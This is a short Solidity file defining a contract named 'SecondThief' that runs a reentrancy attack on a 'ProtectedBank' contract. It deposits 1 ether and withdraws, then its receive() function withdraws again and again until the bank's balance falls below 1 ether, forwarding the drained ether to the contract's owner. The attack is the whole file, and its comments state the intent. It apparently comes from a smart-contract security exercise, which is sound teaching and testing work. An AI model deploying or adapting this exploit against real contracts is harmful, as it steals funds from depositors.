// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./ProtectedBank.sol";

contract SecondThief {
    ProtectedBank public immutable bank;
    address public owner;

    constructor(address _bankAddress) {
        owner = msg.sender;
        bank = ProtectedBank(_bankAddress);
    }

    // Initiates the re-entrance attack
    function steal() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // When ETH is sent back, execute this function which withdraws even more ETH
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
